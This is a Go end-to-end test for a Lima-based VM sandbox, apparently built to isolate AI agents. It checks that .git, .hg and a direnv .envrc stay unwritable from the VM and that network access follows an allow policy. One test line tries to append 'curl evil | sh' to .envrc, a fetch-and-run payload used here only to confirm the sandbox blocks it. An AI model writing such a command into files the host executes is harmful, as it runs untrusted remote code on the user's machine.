//go:build e2e

package vm

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/lima-vm/lima/v2/pkg/instance"
)

// A real VM, with a protected share: go test -tags e2e ./internal/vm/
// Downloads Debian's image, and boots it (slow without hardware
// acceleration: AGENT_VM_E2E_TIMEOUT, default 20m).
func TestLimaBoot(t *testing.T) {
	timeout := 20 * time.Minute
	if v := os.Getenv("AGENT_VM_E2E_TIMEOUT"); v != "" {
		d, err := time.ParseDuration(v)
		if err != nil {
			t.Fatal(err)
		}
		timeout = d
	}
	ctx := instance.WithWatchHostAgentTimeout(context.Background(), timeout)
	l := newTestLima(t)
	proj := t.TempDir()
	if err := os.MkdirAll(filepath.Join(proj, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(proj, ".git", "config"), []byte("[core]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	off := false
	mounts := []Mount{{Location: proj, MountPoint: proj, Writable: true,
		SSHFS: &SSHFS{SFTPDriver: "builtin", Cache: &off, ReadonlyNames: []string{".git", ".hg"}}}}
	rev := ReverseSSHFS
	name := "agent-vm-e2e-00000000"
	if err := l.Create(ctx, name, "template:debian-13", Settings{CPUs: 1, MemoryGiB: 2, DiskGiB: 10, Mounts: &mounts, MountType: &rev, NoContainerd: true}, io.Discard); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = l.Delete(context.Background(), name) })

	// Two servers on this machine's loopback, one allowed to the VMs. The
	// hostagent (this test binary again) reads the policy from the state
	// folder.
	stateDir := t.TempDir()
	t.Setenv("AGENT_VM_STATE_DIR", stateDir)
	t.Setenv("AGENT_VM_GUARDED_WRITES", "deny")
	os.WriteFile(filepath.Join(proj, ".envrc"), []byte("export A=1\n"), 0o644)
	denied, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer denied.Close()
	allowed, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer allowed.Close()
	os.WriteFile(filepath.Join(stateDir, "network"), []byte("allow "+allowed.Addr().String()+"\n"), 0o644)

	var log bytes.Buffer
	start := time.Now()
	if err := l.Start(ctx, name, &log); err != nil {
		t.Fatalf("start: %v\n%s", err, log.String())
	}
	t.Logf("booted in %v", time.Since(start).Round(time.Second))

	run := func(script string) (int, string) {
		var out bytes.Buffer
		code, err := l.Shell(ctx, name, ShellOpts{Workdir: proj, Args: []string{"sh", "-c", script}, Stdout: &out, Stderr: &out})
		if err != nil {
			t.Fatal(err)
		}
		return code, out.String()
	}
	if code, out := run("echo hi > from-vm && printf 'a\\n' >> from-vm && printf 'b\\n' >> from-vm"); code != 0 {
		t.Fatalf("writing the project: %d %s", code, out)
	}
	if b, _ := os.ReadFile(filepath.Join(proj, "from-vm")); string(b) != "hi\na\nb\n" {
		t.Errorf("on the host: %q", b)
	}
	if code, out := run("echo x >> .git/config"); code == 0 {
		t.Error(".git/config was writable from the VM")
	} else if !strings.Contains(out, "ermission denied") && !strings.Contains(out, "Read-only") {
		t.Logf("refused with: %s", out)
	}
	if b, _ := os.ReadFile(filepath.Join(proj, ".git", "config")); string(b) != "[core]\n" {
		t.Errorf(".git/config changed: %q", b)
	}
	if code, _ := run("mkdir .hg"); code == 0 {
		t.Error("a .hg could be created")
	}
	// A guarded file (direnv runs it on the host): refused, no one to ask.
	if code, _ := run("echo 'curl evil | sh' >> .envrc"); code == 0 {
		t.Error(".envrc was writable from the VM")
	}
	if b, _ := os.ReadFile(filepath.Join(proj, ".envrc")); string(b) != "export A=1\n" {
		t.Errorf(".envrc changed: %q", b)
	}
	// The network: this machine's loopback only where allowed (through the
	// gateway, which maps to it); the internet.
	connect := func(addr string) bool {
		host, port, _ := net.SplitHostPort(addr)
		code, _ := run(fmt.Sprintf("timeout 10 bash -c 'echo > /dev/tcp/%s/%s'", host, port))
		return code == 0
	}
	_, deniedPort, _ := net.SplitHostPort(denied.Addr().String())
	_, allowedPort, _ := net.SplitHostPort(allowed.Addr().String())
	if connect("192.168.5.2:" + deniedPort) {
		t.Error("the VM reached a server on this machine's loopback")
	}
	if !connect("192.168.5.2:" + allowedPort) {
		t.Error("the VM did not reach the allowed server on this machine's loopback")
	}
	if !connect("1.1.1.1:443") {
		t.Error("the VM did not reach the internet")
	}
	// 0.2's migration, the VM running: stopped through its hostagent, moved.
	old := os.Getenv("LIMA_HOME")
	// Next to it: no longer, for the sockets.
	now := filepath.Join(filepath.Dir(old), "n")
	if err := MoveOld(ctx, old, now, name, "e2e-00000000"); err != nil {
		t.Fatal(err)
	}
	name = "e2e-00000000"
	l2, err := NewLima(now, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = l2.Delete(context.Background(), name) })
	if inst, err := l2.Get(ctx, name); err != nil || inst.Status != Stopped || len(inst.Mounts) != 1 {
		t.Errorf("moved: %v %+v", err, inst)
	}
	if err := l2.Start(ctx, name, &log); err != nil {
		t.Fatalf("start in the new home: %v\n%s", err, log.String())
	}
	if code, out := run("cat from-vm"); code != 0 || out != "hi\na\nb\n" {
		t.Errorf("after the move: %d %q", code, out)
	}
	if err := l2.Stop(ctx, name); err != nil {
		t.Fatal(err)
	}
	if inst, _ := l2.Get(ctx, name); inst.Status != Stopped {
		t.Errorf("after stop: %s", inst.Status)
	}
}
